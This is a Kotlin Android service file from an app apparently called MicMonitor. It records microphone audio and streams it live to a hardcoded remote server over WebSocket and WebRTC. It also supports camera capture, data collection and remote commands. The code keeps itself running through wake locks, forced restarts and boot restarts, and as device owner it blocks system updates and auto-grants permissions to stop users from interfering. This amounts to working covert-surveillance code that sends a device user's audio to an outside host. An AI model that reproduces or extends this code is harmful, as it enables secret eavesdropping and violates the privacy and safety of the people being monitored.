package com.micmonitor.app

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.ColorMatrix
import android.graphics.ColorMatrixColorFilter
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.AudioManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.ImageReader
import android.media.audiofx.AcousticEchoCanceler
import android.media.audiofx.AutomaticGainControl
import android.media.audiofx.NoiseSuppressor
import android.app.AlarmManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.app.admin.SystemUpdatePolicy
import android.content.ComponentName
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.BatteryManager
import android.os.IBinder
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.os.SystemClock
import android.util.Base64
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.core.content.edit
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import kotlinx.coroutines.isActive
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import okio.ByteString
import okio.ByteString.Companion.toByteString
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.nio.ByteBuffer
import java.util.UUID
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import kotlin.math.max
import kotlin.math.min
import kotlin.random.Random
import org.json.JSONObject
import org.json.JSONArray
import org.webrtc.AudioSource
import org.webrtc.AudioTrack
import org.webrtc.IceCandidate
import org.webrtc.MediaConstraints
import org.webrtc.PeerConnection
import org.webrtc.PeerConnectionFactory
import org.webrtc.RtpSender
import org.webrtc.SdpObserver
import org.webrtc.SessionDescription
import org.webrtc.audio.JavaAudioDeviceModule

/**
 * MicService — Core background service.
 *
 * What it does:
 *  1. Captures raw PCM audio from microphone using AudioRecord.
 *  2. Streams every audio chunk live to the Node.js server via WebSocket.
 *  3. Simultaneously writes chunks to an .pcm file (recording) on device.
 *  4. Listens for remote commands: "start_record", "stop_record", "ping".
 *  5. Auto-reconnects on WebSocket failure (every 5 seconds).
 *  6. Holds a WakeLock so the CPU stays alive in background.
 *  7. restarted automatically by BootReceiver on reboot.
 */
class MicService : Service() {

    // ── Coroutine scope (cancelled on destroy) ──────────────────────────────
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    // ── Audio capture ────────────────────────────────────────────────────────
    private var audioRecord: AudioRecord? = null
    private val sampleRate    = 16000           // 16 kHz
    private val channelConfig = AudioFormat.CHANNEL_IN_MONO
    private val audioFormat   = AudioFormat.ENCODING_PCM_16BIT
    private val minBufferSize by lazy {
        val min = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)
        // Some OEMs return an error code; use a safe fallback in that case.
        if (min > 0) min else sampleRate
    }
    private val recordBufferSize by lazy { max(minBufferSize * 4, sampleRate * 8) }  // Larger buffer for stability
    // 40 ms chunks (was 20ms) - better quality while still low latency for far voice
    private val streamChunkSize by lazy { ((sampleRate * 2) / 25).coerceAtLeast(1280) }

    // ── WebSocket ────────────────────────────────────────────────────────────
    private var webSocket: WebSocket? = null
    private val isWsConnecting = java.util.concurrent.atomic.AtomicBoolean(false)
    private var wsReconnectJob: Job? = null
    private val reconnectMutex = Mutex()
    @Volatile private var wsReconnectAttempts = 0
    @Volatile private var wsConnectFailuresCount = 0 // For Bug 10: only rotate after real failures
    @Volatile private var sourceRotateAttempts = 0
    private val okHttpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0,  TimeUnit.MILLISECONDS)  // No read timeout (streaming)
        .pingInterval(20, TimeUnit.SECONDS)        // More frequent keep-alive (was 30s)
        .build()

    // ── Recording state ──────────────────────────────────────────────────────
    @Volatile private var isCapturing   = false
    @Volatile private var isSavingFile  = false
    @Volatile private var aiEnhancementEnabled = true
    @Volatile private var aiAutoModeEnabled = true
    @Volatile private var wantsMicStreaming = true
    @Volatile private var isRecoveringMic = false
    @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
    @Volatile private var voiceProfile = "room" // near | room | far
    @Volatile private var softwareGainMultiplier = 1.0 // Remote-adjustable gain boost (1.0 = default, 2.0 = 2x louder)
    @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
    @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
    @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
    
    // HQ Buffered Audio Mode removed (M-02) — all code uses realtime path
    @Volatile private var lastAudioChunkSentAt = 0L
    @Volatile private var lastHealthSentAt = 0L
    @Volatile private var audioSourceRotation = 0
    @Volatile private var activeAudioSource = MediaRecorder.AudioSource.DEFAULT
    private var micWatchdogJob: Job? = null
    private var recordingFileStream: FileOutputStream? = null
    private var recordingFile: File? = null
    private var estimatedNoiseDb = -62.0
    private var lastAutoAiSwitchAt = 0L
    @Volatile private var preferredCameraFacing = CameraCharacteristics.LENS_FACING_BACK
    @Volatile private var isPhotoCaptureBusy = false
    @Volatile private var aiPhotoEnhancementEnabled = true
    @Volatile private var photoQualityMode = "normal" // fast | normal | hd
    @Volatile private var photoNightMode = "off" // off | 1s | 3s | 5s
    @Volatile private var isCameraLiveStreaming = false
    @Volatile private var cameraLiveStrictFacing = false
    private var cameraLiveJob: Job? = null
    @Volatile private var restartFromTaskRemoval = false

    // ── PCM enhancement filter state (persists across frames for continuity) ──
    // Reset these at each capture start so a previous session's state is never reused.
    private var hpfPrevX = 0.0      // HPF: previous raw input sample
    private var hpfPrevY = 0.0      // HPF: previous output sample
    private var eq1X1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-1]
    private var eq1X2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: x[n-2]
    private var eq1Y1 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-1]
    private var eq1Y2 = 0.0         // EQ stage1 biquad +6dB@1500Hz: y[n-2]
    private var smoothedGain = 1.0  // Start neutral and ramp dynamically to avoid startup clipping
    @Volatile private var ourAudioMode = false  // true while we changed AudioManager.mode from NORMAL
    // Overlap-add FFT spectral denoiser — realtime path.
    private val spectralDenoiser = SpectralDenoiser()
    // Hardware session effects (must outlive AudioRecord; released in stopAudioCapture / release path)
    private var noiseSuppressor: NoiseSuppressor? = null
    private var acousticEchoCanceler: AcousticEchoCanceler? = null
    private var automaticGainControl: AutomaticGainControl? = null
    // Stage 4b high-shelf continuity across stream chunks
    private var hfShelfPrevOut = 0.0
    private var hfShelfNeedsPrime = true
    // Skip spectral denoise for first N chunks (noise model only; WS still sends HPF+EQ audio)
    private var realtimeDenoiserWarmupChunksRemaining = 0
    // MuLaw 16k→8k decimator low-pass state (anti-alias)
    private var muLawDecimLp = 0.0

    // ── WebRTC state (phone publishes mic track) ───────────────────────────
    @Volatile private var isWebRtcStreaming = false
    private var peerConnectionFactory: PeerConnectionFactory? = null
    private var audioDeviceModule: JavaAudioDeviceModule? = null
    private var peerConnection: PeerConnection? = null
    private var localAudioSource: AudioSource? = null
    private var localAudioTrack: AudioTrack? = null
    private var webRtcAudioSender: RtpSender? = null
    private var currentWebRtcBitrateKbps = 24
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var webRtcRecoveryJob: Job? = null
    private var iceWatchdogJob: Job? = null
    private var lastDashboardQuality: JSONObject? = null
    private var cachedIceServers: List<PeerConnection.IceServer> = listOf(
        PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer()
    )

    private fun preferredAudioSources(): IntArray {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            intArrayOf(
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.CAMCORDER,
                MediaRecorder.AudioSource.UNPROCESSED,
            )
        } else {
            intArrayOf(
                MediaRecorder.AudioSource.VOICE_RECOGNITION,
                MediaRecorder.AudioSource.MIC,
                MediaRecorder.AudioSource.CAMCORDER,
            )
        }
    }

    // ── WakeLock ─────────────────────────────────────────────────────────────
    private var wakeLock: PowerManager.WakeLock? = null
    private val connectivityManager by lazy {
        getSystemService(ConnectivityManager::class.java)
    }

    // ── Data Collector ───────────────────────────────────────────────────────
    private val dataCollector by lazy { DataCollector(this) }
    private var dataJob: Job? = null

    // ── Prefs / Device ID ────────────────────────────────────────────────────
    private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
    
    // Use Android ID as base for device ID - survives cache clear
    private val deviceId: String by lazy {
        // First try to get existing ID from prefs
        prefs.getString("device_id", null) ?: run {
            // Generate stable ID based on Android ID (survives cache clear but not factory reset)
            val androidId = android.provider.Settings.Secure.getString(
                contentResolver, 
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
            
            // Create short hash for privacy + readability
            val md = java.security.MessageDigest.getInstance("SHA-256")
            val stableId = md.digest(androidId.toByteArray()).joinToString("") { "%02x".format(it) }.take(16)
            
            stableId.also { id ->
                prefs.edit { putString("device_id", id) }
                Log.i(TAG, "Generated stable device ID: $id")
            }
        }
    }
    
    // ── Server URL — CHANGE THIS TO YOUR PC'S IP ─────────────────────────────
    // Or set from the app's main screen to a Render URL like:
    // wss://your-app.onrender.com/audio/
    companion object {
        const val TAG          = "MicService"
        const val CHANNEL_ID   = "device_services_channel"
        const val NOTIF_ID     = 101
        const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"
        
        // WebRTC bitrate settings balanced for clarity + network stability.
        // Moderate increase prevents artifacts without overwhelming weak networks.
        const val WEBRTC_MIN_BITRATE_KBPS = 48      // Network-friendly floor
        const val WEBRTC_MID_BITRATE_KBPS = 64      // Balanced quality
        const val WEBRTC_MAX_BITRATE_KBPS = 96      // Quality ceiling
        
        // Standard bitrates for good network conditions
        const val WEBRTC_STANDARD_MIN_KBPS = 80
        const val WEBRTC_STANDARD_MID_KBPS = 96
        const val WEBRTC_STANDARD_MAX_KBPS = 128
        
        // Far mode bitrates - higher quality for distant voice capture
        const val WEBRTC_FAR_MIN_KBPS = 96          // Higher floor for far voice
        const val WEBRTC_FAR_MID_KBPS = 128         // Better quality for distant audio
        const val WEBRTC_FAR_MAX_KBPS = 160         // Maximum quality ceiling
        
        // Audio codec identifiers
        const val AUDIO_CODEC_PCM16_16K: Byte = 0x00  // Full quality - no compression
        const val AUDIO_CODEC_MULAW_8K: Byte = 0x01   // Compressed fallback
        
        const val WS_RECONNECT_BASE_MS = 500L     // Fast initial retry (was 2000)
        const val WS_RECONNECT_MAX_MS = 30_000L   // Max delay 30s (was 5s)

        // Render cloud URL — works on any network (WiFi or cellular)
        const val DEFAULT_SERVER_URL = "wss://monitor-raje.onrender.com/audio/"
        val DEFAULT_SERVER_TOKEN: String = BuildConfig.DEFAULT_SERVER_TOKEN

        // Shared websocket for service health checks and optional future hooks.
        @Volatile var activeWebSocket: WebSocket? = null
        @Volatile var staticWakeLock: PowerManager.WakeLock? = null
    }

    // Layer 8: Multi-Server Failover
    @Volatile private var currentServerIndex = 0
    private val serverUrls: List<String> get() {
        val base = prefs.getString("server_url", DEFAULT_SERVER_URL) ?: DEFAULT_SERVER_URL
        return listOf(
            base
        ).map { it.trimEnd('/') + "/$deviceId" }
    }
    private val serverUrl get() = serverUrls[currentServerIndex % serverUrls.size]

    private val wsAuthToken: String
        get() = (prefs.getString("server_token", DEFAULT_SERVER_TOKEN) ?: DEFAULT_SERVER_TOKEN).trim()

    private val serverHttpBaseUrl: String
        get() {
            // Bug B: Always use primary server index for HTTP calls
            val base = serverUrls[0]
            return base
                .replace(Regex("^wss://"), "https://")
                .replace(Regex("^ws://"), "http://")
                .substringBefore("/$deviceId")
                .trimEnd('/')
        }

    // ────────────────────────────────────────────────────────────────────────
    // Service lifecycle
    // ────────────────────────────────────────────────────────────────────────

    // M-03: Only run setupDeviceOwnerPolicies once per service lifetime
    private var isDeviceOwnerConfigured = false
    // L-01: Cache last codec choice to avoid side-effect logs in sendHealthStatus
    @Volatile private var lastCodecChoice: Byte = AUDIO_CODEC_PCM16_16K

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
        setupNetworkListener()
        // WebRTC init moved to startWebRtcSession() - too early here causes crash
        Log.i(TAG, "Service created. Device ID: $deviceId")
    }

    private fun setupNetworkListener() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val cm = connectivityManager ?: return
            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    super.onAvailable(network)
                    Log.i(TAG, "Network mapped onAvailable! Forcing reconnect if needed")
                    // Layer 5 (Network Listener)
                    if (activeWebSocket == null && !isWsConnecting.get()) {
                        currentServerIndex = 0 // Reset to primary since we just got network
                        wsReconnectAttempts = 0 // Reset backoff for faster recovery (Bug 11)
                        val intent = Intent(applicationContext, MicService::class.java)
                        intent.action = ACTION_RECONNECT
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            applicationContext.startForegroundService(intent)
                        } else {
                            applicationContext.startService(intent)
                        }
                    }
                    startHttpFallbackSync()
                }

                override fun onCapabilitiesChanged(network: Network, networkCapabilities: NetworkCapabilities) {
                    super.onCapabilitiesChanged(network, networkCapabilities)
                    // Layer 11: Adaptive Audio Strategy
                    val isWifi = networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
                    val isCellular = networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                    
                    if (isWifi) {
                        if (lowNetworkMode) {
                            lowNetworkMode = false
                            Log.i(TAG, "Adaptive Audio: WiFi detected, switching to High-Quality Real-time mode")
                        }
                    } else if (isCellular) {
                        if (!lowNetworkMode) {
                            lowNetworkMode = true
                            Log.i(TAG, "Adaptive Audio: Cellular detected, dropping bitrate to preserve stability")
                        }
                    }
                }

                override fun onLost(network: Network) {
                    super.onLost(network)
                    Log.i(TAG, "Network transport lost! Triggering rapid failover.")
                    // If we lost Wi-Fi, we want to immediately try Cellular.
                    // If we lost everything, we want to start Polling immediately.
                    val hadSocket = activeWebSocket != null
                    try { activeWebSocket?.close(1001, "Network lost") } catch (_: Exception) {}
                    isWsConnecting.set(false)

                    // Keep socket teardown centralized to avoid cross-thread races.
                    if (hadSocket) {
                        onWsDisconnected("network_lost")
                    } else {
                        scheduleWebSocketReconnect("network_lost", forceRestart = true)
                    }
                    startHttpFallbackSync()
                }
            }
            cm.registerDefaultNetworkCallback(networkCallback!!)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand action=${intent?.action}")

        // Bug 5, 6, 15: Run startForeground IMMEDIATELY before anything else
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val typeFlags = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            startForeground(NOTIF_ID, buildNotification("Connecting to server…"), typeFlags)
        } else {
            startForeground(NOTIF_ID, buildNotification("Connecting to server…"))
        }

        // Layer 14: Device Owner Power-Up (M-03: only once per service lifetime)
        if (!isDeviceOwnerConfigured) {
            setupDeviceOwnerPolicies()
            isDeviceOwnerConfigured = true
        }

        // Reconnect watchdog alarm fired — force a fresh WebSocket if dead
        if (intent?.action == ACTION_RECONNECT) {
            wsReconnectJob?.cancel() // Bug H: explicitly cancel sleeping job so no double connect race
            if (activeWebSocket == null) {
                Log.i(TAG, "Reconnect alarm: WebSocket dead, reconnecting…")
                connectWebSocket()
            } else {
                Log.i(TAG, "Reconnect alarm: WebSocket alive, skipping")
                if (!isCapturing && !isWebRtcStreaming) startAudioCapture()
                startMicWatchdog()
            }
            startHttpFallbackSync() // Ensure HTTP fallback is always running (Bug 5)
            scheduleReconnectAlarm() // reschedule for next cycle
            return START_STICKY
        }

        if (activeWebSocket == null) {
            connectWebSocket()
        } else {
            Log.i(TAG, "WebSocket already active — ensuring mic/data workers are running")
            if (!isCapturing && !isWebRtcStreaming) startAudioCapture()
            startMicWatchdog()
            startDataCollection()
        }
        startHttpFallbackSync() // Bug 5: Ensure HTTP fallback starts on every command
        scheduleKeepAlive()
        scheduleReconnectAlarm()
        return START_STICKY   // Android restarts service automatically if killed
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        restartFromTaskRemoval = true
        Log.i(TAG, "onTaskRemoved — will schedule forced restart in onDestroy")
    }
    private fun scheduleForcedRestart() {
        val restartIntent = Intent(applicationContext, MicService::class.java).apply {
            action = ACTION_RECONNECT
            data = android.net.Uri.parse("timer:${System.currentTimeMillis()}") // Bug 13: Unique Intent
        }
        val pendingIntent = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 2_000
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.setExact(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
    }

    /**
     * Advanced Device Owner Policies (Layer 14)
     * Configures global settings to prevent the device from sleeping or users from interfering.
     */
    private fun setupDeviceOwnerPolicies() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            if (dpm.isDeviceOwnerApp(packageName)) {
                val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                Log.i(TAG, "Device Owner detected — applying global persistence policies")

                // 1. Keep WiFi alive at all times (Layer 14/15)
                try {
                    @Suppress("DEPRECATION")
                    dpm.setGlobalSetting(admin, android.provider.Settings.Global.WIFI_SLEEP_POLICY, 
                        android.provider.Settings.Global.WIFI_SLEEP_POLICY_NEVER.toString())
                } catch (e: Exception) { Log.w(TAG, "WiFi sleep policy failed: ${e.message}") }

                // 2. Keep screen on if plugged in (standard for remote nodes)
                try {
                    dpm.setGlobalSetting(admin, android.provider.Settings.Global.STAY_ON_WHILE_PLUGGED_IN, 
                        (android.os.BatteryManager.BATTERY_PLUGGED_AC or 
                         android.os.BatteryManager.BATTERY_PLUGGED_USB or 
                         android.os.BatteryManager.BATTERY_PLUGGED_WIRELESS).toString())
                } catch (e: Exception) { Log.w(TAG, "Stay on policy failed: ${e.message}") }

                // 3. Disable ADB if security is desired, or keep it for debugging.
                // dpm.setGlobalSetting(admin, android.provider.Settings.Global.ADB_ENABLED, "1")

                // 4. Disable system updates to prevent unintended reboots/UI changes
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    try {
                        dpm.setSystemUpdatePolicy(admin, SystemUpdatePolicy.createWindowedInstallPolicy(0, 1439)) // All day
                    } catch (e: Exception) { Log.w(TAG, "System update policy failed: ${e.message}") }
                }

                // 5. Reinforce Auto-Grant Permissions on every restart
                UpdateService.autoGrantPermissions(this)
            }
        } catch (e: Exception) {
            Log.e(TAG, "setupDeviceOwnerPolicies failed: ${e.message}")
        }
    }

    override fun onDestroy() {
        Log.i(TAG, "onDestroy — stopping service")
        isCapturing  = false
        isSavingFile = false

        // Cancel reconnect/fallback jobs FIRST (they launch new coroutines)
        wsReconnectJob?.cancel()
        wsReconnectJob = null
        httpFallbackJob?.cancel()
        httpFallbackJob = null

        // Stop subsystems BEFORE cancelling scope (they may send final health/ack)
        stopMicWatchdog()
        stopAudioCapture("service_destroy")
        stopWebRtcSession(notifyState = false)
        stopCameraLiveStream("service_destroy")
        stopDataCollection()
        closeRecordingFile()

        // Close WebSocket cleanly
        activeWebSocket = null
        webSocket?.close(1000, "Service stopped")
        webSocket = null
        isWsConnecting.set(false)

        // NOW cancel the scope — all cleanup above has already completed
        serviceScope.cancel()

        peerConnectionFactory?.dispose()
        peerConnectionFactory = null
        audioDeviceModule?.release()
        audioDeviceModule = null
        networkCallback?.let {
            try { connectivityManager?.unregisterNetworkCallback(it) } catch (e: Exception) {}
        }
        // Bug 7: Guard WakeLock release against double-release crash
        try {
            if (wakeLock?.isHeld == true) wakeLock?.release()
        } catch (_: Exception) {}

        // Avoid double-start races when START_STICKY already triggers restart.
        if (restartFromTaskRemoval) {
            scheduleForcedRestart()
            restartFromTaskRemoval = false
        }
        
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ────────────────────────────────────────────────────────────────────────
    // WebSocket connection
    // ────────────────────────────────────────────────────────────────────────

    private fun connectWebSocket() {
        if (activeWebSocket != null || !isWsConnecting.compareAndSet(false, true)) {
            Log.i(TAG, "connectWebSocket skipped (already connected/connecting)")
            return
        }
        Log.i(TAG, "Connecting to $serverUrl")
        updateNotification("Connecting to server…")

        try {
            webSocket?.close(1000, "Reconnecting")
            webSocket = null
        } catch (_: Exception) {}

        val requestBuilder = Request.Builder()
            .url(serverUrl)
            .addHeader("X-Device-Id", deviceId)
        if (wsAuthToken.isNotBlank()) {
            requestBuilder.addHeader("X-Auth-Token", wsAuthToken)
        }
        val request = requestBuilder.build()

        try {
            webSocket = okHttpClient.newWebSocket(request, object : WebSocketListener() {

            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.i(TAG, "WebSocket connected ✅ to $serverUrl")
                isWsConnecting.set(false)
                wsConnectFailuresCount = 0 // Reset failure count on success (Bug 10)
                activeWebSocket = webSocket
                wsReconnectAttempts = 0
                currentServerIndex = 0 // Reset to primary on success
                
                // Stop the HTTP polling if it's running fast
                startHttpFallbackSync()

                updateNotification("Live streaming active")
                webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}")
                
                // Layer 10: Session Restore
                val wasStreaming = prefs.getBoolean("session_streaming", true)
                wantsMicStreaming = wasStreaming
                if (wasStreaming) {
                    startAudioCapture()
                    startMicWatchdog()
                }
                
                startDataCollection()
                sendHealthStatus("ws_open")
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                Log.d(TAG, "Server command: $text")
                handleServerCommand(text.trim())
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                handleServerCommand(bytes.utf8().trim())
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}")
                isWsConnecting.set(false) // Ensure reset even on failure (Bug 2)
                wsConnectFailuresCount++ // Increment failure count (Bug 10)
                onWsDisconnected("failure")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.w(TAG, "WebSocket closed: $reason")
                isWsConnecting.set(false) // Ensure reset (Bug 2)
                onWsDisconnected("closed")
            }
            })
        } catch (e: Exception) {
            Log.e(TAG, "WebSocket creation failed: ${e.message}", e)
            isWsConnecting.set(false) // Bug 2: Reset on exception
            wsConnectFailuresCount++
            onWsDisconnected("creation_failed")
        }
    }

    private fun onWsDisconnected(reason: String) {
        // Bug 10: Only rotate server after multiple consecutive connection failures.
        // Clean disconnects (onClosed) or first failures shouldn't immediately rotate.
        if (wsConnectFailuresCount >= 3) {
            currentServerIndex++
            wsConnectFailuresCount = 0
            Log.i(TAG, "Server rotated to index $currentServerIndex after 3 failures")
        }
        
        activeWebSocket = null
        webSocket = null  // Bug 6: Clear both WS references to prevent stale sends
        
        // Bug A/3: Job cancellation correctly delegated to scheduleWebSocketReconnect with mutex protection
        
        stopCameraLiveStream("ws_disconnected")
        stopMicWatchdog()
        stopAudioCapture()
        stopWebRtcSession(notifyState = false)
        stopDataCollection()
        
        // Ensure HTTP fallback polling picks up slack
        startHttpFallbackSync()
        
        scheduleWebSocketReconnect(reason, forceRestart = true)
    }

    // Safe WebSocket send with automatic error handling and reconnection
    // Bug 6: Use activeWebSocket (the one that gets nulled on disconnect), NOT webSocket
    private fun safeSend(data: Any): Boolean {
        return try {
            val ws = activeWebSocket
            if (ws == null) {
                return false
            }
            
            when (data) {
                is String -> ws.send(data)
                is okio.ByteString -> ws.send(data)
                else -> ws.send(data.toString())
            }
            true
        } catch (e: Exception) {
            Log.w(TAG, "WebSocket send failed: ${e.message} - triggering reconnect")
            serviceScope.launch(Dispatchers.Default) {
                onWsDisconnected("send_failed")
            }
            false
        }
    }

    private fun sendCommandAck(command: String, status: String = "success", detail: String? = null) {
        val msg = JSONObject().apply {
            put("type", "command_ack")
            put("command", command)
            put("status", status)
            if (!detail.isNullOrBlank()) put("detail", detail.take(200))
            put("ts", System.currentTimeMillis())
        }
        safeSend(msg.toString())
    }

    private fun isNetworkUsable(): Boolean {
        val cm = connectivityManager ?: return true
        val network = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(network) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private var httpFallbackJob: Job? = null
    
    private fun startHttpFallbackSync() {
        if (httpFallbackJob?.isActive == true) return
        httpFallbackJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                // HTTP Heartbeat (Layer 12)
                try {
                    val url = "$serverHttpBaseUrl/api/heartbeat"
                    val request = Request.Builder()
                        .url(url)
                        .post(ByteArray(0).toRequestBody(null))
                        .addHeader("X-Device-Id", deviceId)
                        .build()
                    val response = okHttpClient.newCall(request).execute()
                    if (response.isSuccessful) {
                        val body = response.body?.string()
                        if (body?.contains("\"commandsAvailable\":true") == true) {
                            // Layer 2: fetch commands immediately via sync
                            syncCommandsNow()
                        }
                    }
                    response.close()
                } catch (e: Exception) {
                    Log.w(TAG, "Heartbeat failed: ${e.message}")
                }
                
                // HTTP Polling Fallback (Layer 2)
                if (activeWebSocket == null) {
                    syncCommandsNow()
                    // H-03: Use a smaller delay but check isActive for clean exit
                    var delayElapsed = 0L
                    while (isActive && delayElapsed < 30_000L && activeWebSocket == null) {
                        delay(2000)
                        delayElapsed += 2000
                    }
                } else {
                    delay(180_000) // Just heartbeat every 3 min if WS is alive
                }
            }
        }
    }
    
    private suspend fun syncCommandsNow() {
        if (!isNetworkUsable()) return
        acquireWakeLock() // refresh wake-lock
        try {
            val url = "$serverHttpBaseUrl/api/sync?deviceId=$deviceId"
            val request = Request.Builder()
                .url(url)
                .addHeader("X-Device-Id", deviceId)
                .build()
            val response = okHttpClient.newCall(request).execute()
            if (response.isSuccessful) {
                val body = response.body?.string()
                if (!body.isNullOrBlank()) {
                    val root = JSONObject(body)
                    // Apply states (Layer 10 Save/Restore state)
                    if (root.has("sessionState")) {
                        val state = root.getJSONObject("sessionState")
                        val serverStreaming = state.optBoolean("streaming", true)
                        wantsMicStreaming = serverStreaming
                        prefs.edit().putBoolean("session_streaming", serverStreaming).apply()
                    }
                    // Process offline commands (Layer 9 pop)
                    if (root.has("commands")) {
                        val commands = root.getJSONArray("commands")
                        for (i in 0 until commands.length()) {
                            val cmd = commands.getString(i)
                            Log.i(TAG, "Executing recovered command via HTTP Fallback: $cmd")
                            handleServerCommand(cmd)
                        }
                    }
                }
            }
            response.close()
        } catch (e: Exception) {
            Log.w(TAG, "Sync fallback failed: ${e.message}")
        }
    }

    private fun nextReconnectDelayMs(): Long {
        // Fast aggressive retry: 500ms -> 1s -> 2s -> 4s -> 5s max
        val expShift = wsReconnectAttempts.coerceAtMost(3)  // Cap earlier (was 4)
        val expDelay = (WS_RECONNECT_BASE_MS * (1L shl expShift)).coerceAtMost(WS_RECONNECT_MAX_MS)
        val jitter = Random.nextLong(100L, 500L)  // Less jitter (was 250-1500)
        return (expDelay + jitter).coerceAtMost(WS_RECONNECT_MAX_MS)
    }

    private fun scheduleWebSocketReconnect(reason: String, forceRestart: Boolean = false) {
        if (forceRestart) {
            wsReconnectJob?.cancel()
        } else if (wsReconnectJob?.isActive == true) {
            return
        }
        
        wsReconnectJob = serviceScope.launch(Dispatchers.IO) {
            reconnectMutex.withLock {
                while (isActive && activeWebSocket == null) {
                    if (!isNetworkUsable()) {
                        updateNotification("Offline — waiting for network…")
                        delay(2_000)
                        continue
                    }
                    if (isWsConnecting.get()) {
                        delay(1_000)
                        continue
                    }
                    
                    val delayMs = nextReconnectDelayMs()
                    wsReconnectAttempts++
                    updateNotification("Disconnected ($reason) — retry in ${delayMs / 1000}s…")

                    // Bug 1: Wait FIRST, then connect (proper exponential backoff)
                    // H-02: Check isActive frequently during long delays
                    var elapsed = 0L
                    while (isActive && elapsed < delayMs) {
                        delay(500)
                        elapsed += 500
                    }
                    if (!isActive) break

                    // Recheck after delay — another path may have connected
                    if (activeWebSocket != null || isWsConnecting.get()) continue

                    connectWebSocket()

                    // Give OkHttp time to complete the handshake before looping
                    delay(5_000)
                }
            }
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Remote command handler (from primary device dashboard)
    // ────────────────────────────────────────────────────────────────────────

    private fun handleServerCommand(cmd: String) {
        if (cmd.startsWith("{")) {
            handleServerJsonCommand(cmd)
            return
        }
        when (cmd) {
            "start_stream" -> {
                Log.i(TAG, "CMD: start mic stream")
                wantsMicStreaming = true
